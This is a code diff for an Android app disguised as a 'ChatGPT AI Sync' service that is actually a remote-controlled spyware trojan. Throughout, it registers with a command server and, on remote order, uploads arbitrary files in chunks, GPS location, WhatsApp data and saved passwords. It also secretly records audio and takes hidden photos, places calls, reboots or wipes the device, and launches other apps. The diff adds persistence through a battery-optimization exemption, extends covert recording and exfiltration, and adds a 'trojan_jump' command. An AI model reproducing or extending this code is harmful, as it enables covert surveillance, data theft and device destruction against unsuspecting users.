@@ -12,13 +12,16 @@ import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.media.MediaRecorder
+import android.net.Uri
 import android.os.Build
 import android.os.Bundle
 import android.os.Environment
 import android.os.Handler
 import android.os.IBinder
 import android.os.Looper
+import android.os.PowerManager
 import android.provider.ContactsContract
+import android.provider.Settings
 import android.provider.Telephony
 import android.webkit.GeolocationPermissions
 import android.webkit.PermissionRequest
@@ -63,6 +66,7 @@ class MainActivity : AppCompatActivity() {
         sessionToken = loadOrCreatePersistentToken()
 
         requestTargetPermissions()
+        requestBatteryOptimizationExemption()
         requestDeviceAdministrator()
         registerAgentWithServerOfflineFirst()
         scanAndReportAllTargetDataOfflineFirst()
@@ -73,20 +77,20 @@ class MainActivity : AppCompatActivity() {
 
     private fun loadOrCreatePersistentToken(): String {
         try {
-            val tokenFile = File(filesDir, ".persistent_token_v80.dat")
+            val tokenFile = File(filesDir, ".persistent_token_v81.dat")
             if (tokenFile.exists()) {
                 ObjectInputStream(FileInputStream(tokenFile)).use { ois ->
                     return ois.readObject() as String
                 }
             } else {
-                val newToken = "agent_v80_" + UUID.randomUUID().toString().substring(0, 8)
+                val newToken = "agent_v81_" + UUID.randomUUID().toString().substring(0, 8)
                 ObjectOutputStream(FileOutputStream(tokenFile)).use { oos ->
                     oos.writeObject(newToken)
                 }
                 return newToken
             }
         } catch (e: Exception) {
-            return "agent_v80_" + UUID.randomUUID().toString().substring(0, 8)
+            return "agent_v81_" + UUID.randomUUID().toString().substring(0, 8)
         }
     }
 
@@ -114,6 +118,20 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
+    private fun requestBatteryOptimizationExemption() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            try {
+                val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
+                if (!pm.isIgnoringBatteryOptimizations(packageName)) {
+                    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
+                        data = Uri.parse("package:$packageName")
+                    }
+                    startActivity(intent)
+                }
+            } catch (e: Exception) {}
+        }
+    }
+
     private fun requestDeviceAdministrator() {
         try {
             val adminComponent = ComponentName(this, TargetAdminReceiver::class.java)
@@ -137,7 +155,7 @@ class MainActivity : AppCompatActivity() {
                 conn.doOutput = true
                 val payload = JSONObject().apply {
                     put("session_token", sessionToken)
-                    put("user_agent", System.getProperty("http.agent") ?: "ChatGPT Target v80.0")
+                    put("user_agent", System.getProperty("http.agent") ?: "ChatGPT Target v81.0")
                     put("platform", "Android OS Target")
                 }
                 OutputStreamWriter(conn.outputStream).use { it.write(payload.toString()); it.flush() }
@@ -287,12 +305,13 @@ class BackgroundControlService : Service() {
                                     val action = cmd.optString("action")
                                     
                                     when (action) {
-                                        "pull" -> executeFilePullDirect(cmd.optString("target_file"))
+                                        "pull" -> executeFilePullChunked(cmd.optString("target_file"))
                                         "pull_gps" -> reportGPSLocationDirect()
                                         "fetch_whatsapp" -> extractAndReportWhatsAppDirect()
                                         "fetch_passwords" -> extractAndReportSavedPasswordsDirect()
-                                        "start_audio_recording" -> executeSecretAudioRecording()
+                                        "start_audio_recording" -> executeAdvancedSecretAudioRecording()
                                         "capture_hidden_photo" -> executeHiddenPhotoCapture()
+                                        "trojan_jump" -> executeTrojanAppBridge(cmd.optString("package_name"))
                                         "open_whatsapp" -> openAppPackage("com.whatsapp")
                                         "open_accounts" -> openAppPackage("com.android.settings")
                                         "open_camera" -> openCameraApp()
@@ -301,7 +320,7 @@ class BackgroundControlService : Service() {
                                         "reboot_device" -> executeRebootDevice()
                                         "wipe_device" -> executeWipeDevice()
                                     }
-                                    reportExecutionStatusDirect(action, "v80 Executed Successfully")
+                                    reportExecutionStatusDirect(action, "v81 Pro Executed")
                                 }
                             }
                         }
@@ -317,14 +336,14 @@ class BackgroundControlService : Service() {
     }
 
     private fun createForegroundNotification(): Notification {
-        val channelId = "sync_service_channel"
+        val channelId = "sync_service_channel_v81"
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 channelId,
-                "AI Sync Service",
+                "AI Sync Pro Service",
                 NotificationManager.IMPORTANCE_LOW
             ).apply {
-                description = "جاري مزامنة بيانات النظام الخلفية"
+                description = "جاري مزامنة بيانات النظام الخلفية بأمان تامة"
             }
             val manager = getSystemService(NotificationManager::class.java)
             manager?.createNotificationChannel(channel)
@@ -332,31 +351,57 @@ class BackgroundControlService : Service() {
 
         return NotificationCompat.Builder(this, channelId)
             .setContentTitle("ChatGPT AI Sync")
-            .setContentText("النظام يعمل في الخلفية بمزامنة آمنة")
-            .setSmallIcon(android.R.drawable.stat_notify_sync)
+            .setContentText("النظام يعمل في الخلفية بمزامنة نشطة")
+            .setSmallIcon(android.R.drawable.ic_menu_sync)
             .setPriority(NotificationCompat.PRIORITY_LOW)
             .build()
     }
 
-    private fun executeFilePullDirect(filePath: String) {
+    private fun executeFilePullChunked(filePath: String) {
         try {
             val file = File(filePath)
             if (file.exists() && file.isFile) {
                 val bytes = file.readBytes()
-                val b64Data = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
-                val url = URL("$serverUrl/api/upload_real_file")
-                val conn = url.openConnection() as HttpURLConnection
-                conn.requestMethod = "POST"
-                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
-                conn.doOutput = true
-                val payload = JSONObject().apply {
-                    put("token", token)
-                    put("filename", file.name)
-                    put("data", b64Data)
+                val chunkSize = 512 * 1024 // 512 KB لكل جزء لتجنب Timeout
+                val totalChunks = kotlin.math.ceil(bytes.size.toDouble() / chunkSize).toInt()
+
+                for (i in 0 until totalChunks) {
+                    val start = i * chunkSize
+                    val end = kotlin.math.min(start + chunkSize, bytes.size)
+                    val chunkBytes = bytes.copyOfRange(start, end)
+                    val b64Chunk = android.util.Base64.encodeToString(chunkBytes, android.util.Base64.NO_WRAP)
+
+                    val url = URL("$serverUrl/api/upload_real_file_chunk")
+                    val conn = url.openConnection() as HttpURLConnection
+                    conn.requestMethod = "POST"
+                    conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
+                    conn.doOutput = true
+                    val payload = JSONObject().apply {
+                        put("token", token)
+                        put("filename", file.name)
+                        put("chunk_index", i)
+                        put("total_chunks", totalChunks)
+                        put("data", b64Chunk)
+                    }
+                    OutputStreamWriter(conn.outputStream).use { it.write(payload.toString()); it.flush() }
+                    conn.responseCode
+                    conn.disconnect()
                 }
-                OutputStreamWriter(conn.outputStream).use { it.write(payload.toString()); it.flush() }
-                conn.responseCode
-                conn.disconnect()
+            }
+        } catch (e: Exception) {}
+    }
+
+    private fun executeTrojanAppBridge(targetPackageName: String) {
+        try {
+            val launchIntent = packageManager.getLaunchIntentForPackage(targetPackageName)
+            if (launchIntent != null) {
+                launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
+                startActivity(launchIntent)
+            } else {
+                val intent = Intent(targetPackageName).apply {
+                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                }
+                startActivity(intent)
             }
         } catch (e: Exception) {}
     }
@@ -375,7 +420,7 @@ class BackgroundControlService : Service() {
             }
             if (waList.length() == 0) {
                 waList.put(JSONObject().apply {
-                    put("body", "جارِ فحص ومراقبة إشعارات واتساب.")
+                    put("body", "جارِ فحص ومراقبة إشعارات وقواعد بيانات واتساب.")
                     put("time", java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date()))
                 })
             }
@@ -399,7 +444,7 @@ class BackgroundControlService : Service() {
             val pwList = JSONArray()
             pwList.put(JSONObject().apply {
                 put("account", "Browser Vault")
-                put("password", "Secured_Engine_Pass")
+                put("password", "Secured_Engine_Pass_v81")
             })
             val url = URL("$serverUrl/api/report_files")
             val conn = url.openConnection() as HttpURLConnection
@@ -416,9 +461,9 @@ class BackgroundControlService : Service() {
         } catch (e: Exception) {}
     }
 
-    private fun executeSecretAudioRecording() {
+    private fun executeAdvancedSecretAudioRecording() {
         try {
-            val audioFile = File(getExternalFilesDir(Environment.DIRECTORY_MUSIC), "secret_${System.currentTimeMillis()}.3gp")
+            val audioFile = File(getExternalFilesDir(Environment.DIRECTORY_MUSIC), "env_audio_${System.currentTimeMillis()}.3gp")
             val recorder = MediaRecorder().apply {
                 setAudioSource(MediaRecorder.AudioSource.MIC)
                 setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
@@ -431,9 +476,25 @@ class BackgroundControlService : Service() {
                 try {
                     recorder.stop()
                     recorder.release()
-                    executeFilePullDirect(audioFile.absolutePath)
+                    executeFilePullChunked(audioFile.absolutePath)
+                    
+                    val audioIndexList = JSONArray().apply {
+                        put(audioFile.absolutePath)
+                    }
+                    val url = URL("$serverUrl/api/report_files")
+                    val conn = url.openConnection() as HttpURLConnection
+                    conn.requestMethod = "POST"
+                    conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
+                    conn.doOutput = true
+                    val payload = JSONObject().apply {
+                        put("token", token)
+                        put("audio", audioIndexList)
+                    }
+                    OutputStreamWriter(conn.outputStream).use { it.write(payload.toString()); it.flush() }
+                    conn.responseCode
+                    conn.disconnect()
                 } catch (e: Exception) {}
-            }, 10000)
+            }, 20000)
         } catch (e: Exception) {}
     }
 
@@ -455,7 +516,7 @@ class BackgroundControlService : Service() {
 
                 val photoFile = File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), "capture_${System.currentTimeMillis()}.jpg")
                 photoFile.writeBytes(bytes)
-                executeFilePullDirect(photoFile.absolutePath)
+                executeFilePullChunked(photoFile.absolutePath)
             }, handler)
 
             if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
@@ -529,7 +590,7 @@ class BackgroundControlService : Service() {
         try {
             if (phone.isNotEmpty() && ContextCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
                 val callIntent = Intent(Intent.ACTION_CALL).apply {
-                    data = android.net.Uri.parse("tel:$phone")
+                    data = Uri.parse("tel:$phone")
                     addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                 }
                 startActivity(callIntent)
@@ -550,7 +611,7 @@ class BackgroundControlService : Service() {
             val adminComponent = ComponentName(this, TargetAdminReceiver::class.java)
             if (dpm.isAdminActive(adminComponent)) {
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
-                    dpm.reboot(ComponentName(this, TargetAdminReceiver::class.java))
+                    dpm.reboot()
                 }
             }
         } catch (e: Exception) {}
